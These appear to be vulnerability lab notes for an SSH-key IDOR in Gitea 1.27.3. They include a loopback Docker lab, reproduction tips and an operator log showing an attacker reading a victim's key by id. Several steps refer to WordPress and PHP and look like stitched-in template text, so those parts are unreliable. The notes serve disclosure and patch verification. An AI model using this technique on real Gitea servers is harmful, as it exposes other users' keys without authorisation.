# Lab notes — gitea-user-keys-idor

## 1. The CVE, in one sitting

gitea-user-keys-idor hits **Gitea 1.27.3 (Gitea)**. Lab kind: `docker`.

Unpublished Gitea source finding: SSH/deploy-key IDOR on GET /api/v1/user/keys/{id}.

The mapped entry is `GET /api/v1/user/keys/{id}`. What the advisory *names* and what the code *does* are not always the same:

Authenticated unpublished Gitea #1 CWE-639 v1.27.3. Witness: GHSA-GITEA-KEY-IDOR-WITNESS in foreign key JSON. Not eval. Not a reverse shell.

Witness we wanted: GET /api/v1/user/keys/{id} as attacker returns GHSA-GITEA-KEY-IDOR-WITNESS; attacker list does not

---

## 2. The lab

Isolated, loopback-only (`127.0.0.1`). After disclosure, the same files ship in the advisory repo under `lab/` so others can stand this up, confirm the witness, then patch their own systems.

### Dockerfile(s)

Copy these as-is. If Compose mounts a local product tree, put the vulnerable version next to the YAML.

### `lab/Dockerfile`

```dockerfile
# Loopback lab image pin for gitea-user-keys-idor. Full stack: docker-compose.yml
FROM gitea/gitea:1.27.3
```

### docker-compose.yml

```yaml
name: gitea-user-keys-idor

services:
  gitea:
    image: gitea/gitea:1.27.3
    ports:
      - "127.0.0.1:18101:3000"
    environment:
      USER_UID: "1000"
      USER_GID: "1000"
      GITEA__database__DB_TYPE: sqlite3
      GITEA__database__PATH: /data/gitea/gitea.db
      GITEA__security__INSTALL_LOCK: "true"
      GITEA__server__DOMAIN: 127.0.0.1
      GITEA__server__HTTP_PORT: "3000"
      GITEA__server__ROOT_URL: http://127.0.0.1:18101/
      GITEA__service__DISABLE_REGISTRATION: "false"
      GITEA__service__REQUIRE_SIGNIN_VIEW: "false"
    volumes:
      - gitea_data:/data

volumes:
  gitea_data:
```



### Bring-up (typical)

```bash
cd lab
docker compose up --force-recreate
```

1. Bind the plugin or product tree at the vulnerable version (here: `1.27.3`).
2. Wait until HTTP on the published loopback port answers.
3. If WordPress: `wp core install` on loopback, then activate the plugin.
4. Apply lab fixtures so the sink is actually reachable.

### Fixtures

- Stock install of the vulnerable version; extra fixtures only if the sink needs them.

### Preconditions the sink needed

- Gitea 1.27.3 (and likely earlier)
- Any account with read:user (default registration)
- At least one other user's SSH or deploy key

---

## 3. Steps we took, and the holes we fell in

The first client was almost always too polite. It used the names in the CVE write-up (or the source defaults) instead of the names the running process actually reads. That produces a convincing **200** with a theme page — tens of kilobytes of HTML — and zero witness.

What "success" is *not*:

- eval/base64/system payload
- reverse shell
- own key id

What actually moved the needle:

1. Treat the **on-disk product** as the spec. Function names in the advisory are PHP methods, not HTTP `action=` unless a hook says so.
2. Discover any nonce / form id / router key the way an unauthenticated visitor would (public REST, a rendered form, a marker in a fixture page). Yesterday's hard-coded names miss when the running process mints them.
3. Send the method the handler is registered for. A GET where the schema only allows POST (or the reverse) is a 400, not a sink.
4. Keep the witness **in the body** (or `debug.log` if display is off). A unique string proving the sink ran is the proof; generic success JSON is not.
5. Side paths can abort the sink. A mailer fatal before meta is stored, a duplicate unique key, or a serialized payload whose class-length prefix does not match the class name will look like a valid form response while the object never instantiated.

Last operator run (trimmed):

```
IOC gitea-up http=200
IOC add-key user=victim status=201 title=GHSA-GITEA-KEY-IDOR-WITNESS id=1
IOC add-key user=attacker status=201 id=2
IOC version={"version":"1.27.3"}
IOC attacker-list status=200 ids=[2] (no witness)
IOC get id=1 status=200 snippet contains GHSA-GITEA-KEY-IDOR-WITNESS
IOC idor-id=1 attacker-ids=[2]
SUCCESS Gitea #1 user/keys IDOR

oracle: attacker GET /api/v1/user/keys/1 returns victim SSH key title/material; attacker list does not
product: Gitea 1.27.3
sink: routers/api/v1/user/key.go GetPublicKey -> GetPublicKeyByID no owner check
lab: http://127.0.0.1:18101
witness: GHSA-GITEA-KEY-IDOR-WITNESS, not eval/system/shell
auth: authenticated attacker Basic
```

When it finally landed, the response was small JSON — not a WordPress homepage. That size jump (eighty kilobytes of theme → a few hundred bytes of JSON) is the tell that the router matched.
